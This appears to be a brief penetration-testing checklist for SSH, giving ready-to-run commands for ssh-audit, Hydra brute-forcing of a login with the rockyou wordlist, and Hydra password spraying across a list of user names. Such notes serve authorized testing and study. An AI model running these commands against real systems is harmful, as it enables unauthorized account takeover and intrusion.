# Checklist
- [ ] ssh-audit.py
- [ ] Hydra (Brute Force SSH Login)
- [ ] Password Spraying (if there's a known password)
## ssh-audit 
```bash
ssh-audit.py $IP_ADDRESS
```
## Hydra (Brute Force SSH Login)
```bash
hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt ssh://$IP_ADDRESS:$PORT -t 4 -V
```
## Password Spraying (if there's a known password)
`hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$PASSWORD" ssh://$IP_ADDRESS`